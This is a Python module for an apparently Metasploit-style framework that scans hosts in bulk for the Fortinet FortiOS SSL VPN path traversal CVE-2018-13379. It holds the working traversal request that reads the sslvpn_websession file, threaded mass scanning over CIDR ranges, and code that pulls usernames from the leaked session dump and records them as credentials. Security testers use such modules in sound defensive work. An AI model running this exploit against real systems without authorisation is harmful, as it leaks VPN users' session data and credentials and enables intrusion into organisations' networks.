import re
import ssl
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

TRAVERSAL_PATH = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""
    usernames: list = None

    def __post_init__(self):
        if self.usernames is None:
            self.usernames = []


class FortiosPathTraversalScanner(Auxiliary):
    NAME = "Fortinet FortiOS SSL VPN Path Traversal Scanner (CVE-2018-13379)"
    DESCRIPTION = (
        "Detects Fortinet FortiOS SSL VPN path traversal (CVE-2018-13379) by "
        "requesting the sslvpn_websession file via /remote/fgt_lang. If the "
        "file is returned, the target is vulnerable. Extracts usernames from "
        "the session dump but does not save passwords."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "great"
    SEVERITY = "high"
    DISCLOSED = "2018-06-03"
    CHECK = True
    REFERENCES = [
        "CVE-2018-13379",
        "https://fortiguard.com/advisory/FG-IR-18-384",
        "https://nvd.nist.gov/vuln/detail/CVE-2018-13379",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=443, type=int, description="HTTPS port"),
        Option("TIMEOUT", default=10.0, type=float, description="per-request timeout"),
        Option("THREADS", default=50, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base_url(self, host):
        return "https://" + host + ":" + str(self.options["RPORT"])

    def _request(self, host, path):
        url = self._base_url(host) + path
        headers = {
            "User-Agent": "Mozilla/5.0 (metis)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        status, _hdrs, raw = self.http_request(
            "GET", url, headers, None,
            timeout=self.options["TIMEOUT"],
        )
        return status, raw
    def _extract_usernames(self, body):
        usernames = []
        try:
            text = body.decode("latin-1", errors="replace")
            for m in re.finditer(r"([a-zA-Z0-9_.\-@]{3,64}):[^\s]{1,64}", text):
                candidate = m.group(1)
                if candidate.lower() not in ("var", "fgt", "lang", "http", "https", "user", "pass"):
                    usernames.append(candidate)
        except Exception:
            pass
        return usernames[:10]

    def _probe(self, host):
        try:
            st, body = self._request(host, TRAVERSAL_PATH)
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)

        if st != 200:
            return HostResult(host, "safe", "HTTP " + str(st))

        if b"var fgt_lang =" not in body:
            return HostResult(host, "safe", "traversal blocked")

        usernames = self._extract_usernames(body)
        detail = "vulnerable"
        if usernames:
            detail += " (" + str(len(usernames)) + " user(s))"
        return HostResult(host, "vulnerable", detail, usernames)

    def _record_host_result(self, h):
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name="https", banner="FortiOS SSL VPN",
        )
        info = h.detail
        if h.usernames:
            info += " | users=" + ",".join(h.usernames)
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="high",
            refs="CVE-2018-13379",
            info=info,
        )
        for u in (h.usernames or []):
            self.report_cred(
                h.host, u, "",
                kind="username",
                info="CVE-2018-13379 sslvpn_websession leak",
            )

    def check(self):
        targets = self._expand_targets()
        host = targets[0]
        print(colors.info("check: probing " + self._base_url(host)))
        print(colors.dimmed("  path: " + TRAVERSAL_PATH))

        r = self._probe(host)

        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            for u in r.usernames[:5]:
                print(colors.dimmed("  user: " + u))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info("scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if workspace_active:
                            self._record_host_result(r)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                line = "    " + colors.vuln(h.host) + "  " + colors.dimmed(h.detail)
                print(line)
                for u in h.usernames[:3]:
                    print("      " + colors.session(u))

        return hits
